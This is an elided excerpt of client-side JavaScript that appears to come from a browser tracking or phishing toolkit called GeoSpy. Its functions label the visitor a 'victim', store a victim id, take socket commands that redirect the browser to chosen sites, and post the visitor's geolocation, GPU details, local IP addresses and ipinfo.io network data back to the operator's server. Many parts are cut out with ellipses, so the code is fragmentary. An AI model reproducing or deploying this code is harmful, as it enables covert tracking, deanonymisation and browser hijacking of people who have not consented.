...
function tping() {
    ...
    if (socketGeoSpy != null){
        if (socketGeoSpy.disconnected){
            window.t_sdisconnect = socketGeoSpy.disconnected;
        }
    }
    $.ajax({
...
function getVictimData() {
	...
	if (localStorage.GeoSpy_vId != undefined) {
		d.vId = localStorage.GeoSpy_vId;
        d.vURL = localStorage.GeoSpy_vURL;
	}
...
function defineSockets(self) {
    self.on('my_response', function(msg) {
        switch (msg.data.type){
            case 'network':
                localStorage.setItem("GeoSpy_vURL", urlServices[msg.data.message]);
                window.location.replace('/rv?url=' + urlServices[msg.data.message]);
                break;
            case 'url':
                localStorage.setItem("GeoSpy_vURL", msg.data.message);
        ...
        success: function(response, status) {
            if (status == 'success'){
                $.ajax({
                        ...
                        data :  {"vId" : localStorage.GeoSpy_vId, "lat": response.location.lat, "lon": response.location.lng},
                        dataType: "json",
                        type: 'POST',
...
function workWithNetworks(){
    $.getJSON('//ipinfo.io/json/?callback=?', function(data) {
        ...
        dInfo.vId = localStorage.GeoSpy_vId
        var idx = 0;
...
function queryGPU(){
    ...
    $.ajax({
        url: '/gGpu',
        data: {vId : localStorage.GeoSpy_vId, data : JSON.stringify(v_data)},
        dataType: "json",
        type: 'POST',
        success: function(response) {
    ...
    getIPs : function(){
        getIPs(function(ip){
            $.ajax({
                ...
                data: {"ip" : ip, "id" : localStorage.GeoSpy_vId},
                dataType: "json",
                type: "POST",
                success: function(response) {
